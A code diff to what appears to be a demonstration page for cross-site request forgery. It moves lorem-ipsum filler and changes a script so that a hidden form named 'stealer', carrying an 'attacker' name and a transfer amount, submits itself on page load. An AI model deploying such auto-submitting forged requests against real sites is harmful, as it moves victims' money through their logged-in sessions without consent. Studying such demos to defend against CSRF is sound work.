@@ -9,8 +9,19 @@
     <input type="hidden" name="name" value="attacker">
     <input type="hidden" name="amount" value="5">
   </form>
+  <div>
+    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at magna eget risus elementum rutrum. Praesent risus nisl, vestibulum non sodales eu, pretium ac arcu. Suspendisse vitae auctor nisl. Nullam quis ipsum massa. Morbi quis tellus vel orci consequat mattis eget sed nulla. In dictum consectetur risus a tincidunt. Donec at purus metus, vitae pharetra elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum in neque ac elit dapibus ultrices quis quis turpis. In faucibus enim tortor. Aliquam vitae urna non felis venenatis laoreet eget eget dui. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Etiam at metus lobortis elit lacinia pharetra in eget diam. Sed vitae posuere tellus. Integer tincidunt, justo in lacinia bibendum, ante nisi dictum dui, nec suscipit lorem mi sit amet dui.
+
+    Aliquam erat volutpat. Proin purus purus, pellentesque pellentesque auctor quis, fermentum quis nisi. Ut nisi odio, tristique ac ullamcorper quis, ultricies eu quam. Nunc vel semper magna. Ut faucibus luctus scelerisque. Proin quis ante justo. Donec nisi metus, cursus sed egestas ac, interdum vitae neque. Integer at dapibus velit. Ut facilisis posuere interdum. Donec vitae magna nec ligula posuere luctus. Donec nec est arcu, eget vestibulum ante.
+
+    Ut ac leo eget leo faucibus consectetur mattis sit amet sapien. Mauris iaculis dolor tincidunt mi molestie nec ornare augue eleifend. Pellentesque mi est, facilisis id luctus eget, suscipit ac metus. Ut enim mi, blandit ut posuere eu, dignissim in enim. Sed lorem est, tincidunt tempor convallis in, adipiscing et dolor. In dolor massa, porta id sodales id, bibendum non lorem. Aenean pretium mi mauris, eget eleifend elit. In malesuada malesuada volutpat. Integer sodales venenatis metus a sollicitudin. Etiam porttitor vehicula odio sed iaculis. Sed non justo at turpis blandit condimentum. Pellentesque cursus laoreet feugiat. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi in dolor ipsum. Nam aliquam urna ut magna accumsan malesuada.
+
+    Phasellus suscipit dui id nisl congue sed pharetra mauris tempus. Curabitur ac aliquet nulla. Phasellus quis orci mi. Cras sollicitudin tortor enim, a bibendum ipsum. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. In hac habitasse platea dictumst. Aenean tortor dolor, ornare quis tristique eu, consequat in nulla. Integer porttitor neque mi, sed aliquet tortor. Vestibulum a est sit amet orci cursus pellentesque vel id leo.
+
+    Sed commodo bibendum pulvinar. Fusce tristique consectetur dictum. Quisque ut ligula lectus. Phasellus quam ipsum, commodo id euismod nec, pulvinar quis nisl. Nam lectus velit, tempor nec feugiat vel, hendrerit at quam. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut porttitor justo sit amet lectus pulvinar aliquam. Vestibulum aliquet felis id elit iaculis ac eleifend nisi dictum. Nulla congue condimentum porttitor. Duis sapien mauris, gravida sit amet fermentum nec, adipiscing ac odio. Praesent id vestibulum nunc. Quisque vel enim est, at imperdiet nulla. Integer laoreet gravida facilisis. Suspendisse pretium lacinia libero et sagittis. Morbi ac dolor orci, pharetra ornare elit. Maecenas varius bibendum ornare.
+  </div>
   <script type="text/javascript" charset="utf-8">
-  (function() {
+  $(document).ready(function() {
     var stealer = document.getElementById('stealer');
     console.log(stealer.amount.value);
     // $.ajax({
@@ -23,18 +34,7 @@
     //   url: stealer.action
     // }); // doesn't work on chrome :'(
     stealer.submit();
-  })();
+  });
   </script>
-  <div>
-    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at magna eget risus elementum rutrum. Praesent risus nisl, vestibulum non sodales eu, pretium ac arcu. Suspendisse vitae auctor nisl. Nullam quis ipsum massa. Morbi quis tellus vel orci consequat mattis eget sed nulla. In dictum consectetur risus a tincidunt. Donec at purus metus, vitae pharetra elit. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum in neque ac elit dapibus ultrices quis quis turpis. In faucibus enim tortor. Aliquam vitae urna non felis venenatis laoreet eget eget dui. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Etiam at metus lobortis elit lacinia pharetra in eget diam. Sed vitae posuere tellus. Integer tincidunt, justo in lacinia bibendum, ante nisi dictum dui, nec suscipit lorem mi sit amet dui.
-
-    Aliquam erat volutpat. Proin purus purus, pellentesque pellentesque auctor quis, fermentum quis nisi. Ut nisi odio, tristique ac ullamcorper quis, ultricies eu quam. Nunc vel semper magna. Ut faucibus luctus scelerisque. Proin quis ante justo. Donec nisi metus, cursus sed egestas ac, interdum vitae neque. Integer at dapibus velit. Ut facilisis posuere interdum. Donec vitae magna nec ligula posuere luctus. Donec nec est arcu, eget vestibulum ante.
-
-    Ut ac leo eget leo faucibus consectetur mattis sit amet sapien. Mauris iaculis dolor tincidunt mi molestie nec ornare augue eleifend. Pellentesque mi est, facilisis id luctus eget, suscipit ac metus. Ut enim mi, blandit ut posuere eu, dignissim in enim. Sed lorem est, tincidunt tempor convallis in, adipiscing et dolor. In dolor massa, porta id sodales id, bibendum non lorem. Aenean pretium mi mauris, eget eleifend elit. In malesuada malesuada volutpat. Integer sodales venenatis metus a sollicitudin. Etiam porttitor vehicula odio sed iaculis. Sed non justo at turpis blandit condimentum. Pellentesque cursus laoreet feugiat. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi in dolor ipsum. Nam aliquam urna ut magna accumsan malesuada.
-
-    Phasellus suscipit dui id nisl congue sed pharetra mauris tempus. Curabitur ac aliquet nulla. Phasellus quis orci mi. Cras sollicitudin tortor enim, a bibendum ipsum. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. In hac habitasse platea dictumst. Aenean tortor dolor, ornare quis tristique eu, consequat in nulla. Integer porttitor neque mi, sed aliquet tortor. Vestibulum a est sit amet orci cursus pellentesque vel id leo.
-
-    Sed commodo bibendum pulvinar. Fusce tristique consectetur dictum. Quisque ut ligula lectus. Phasellus quam ipsum, commodo id euismod nec, pulvinar quis nisl. Nam lectus velit, tempor nec feugiat vel, hendrerit at quam. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut porttitor justo sit amet lectus pulvinar aliquam. Vestibulum aliquet felis id elit iaculis ac eleifend nisi dictum. Nulla congue condimentum porttitor. Duis sapien mauris, gravida sit amet fermentum nec, adipiscing ac odio. Praesent id vestibulum nunc. Quisque vel enim est, at imperdiet nulla. Integer laoreet gravida facilisis. Suspendisse pretium lacinia libero et sagittis. Morbi ac dolor orci, pharetra ornare elit. Maecenas varius bibendum ornare.
-  </div>
 </body>
 </html>
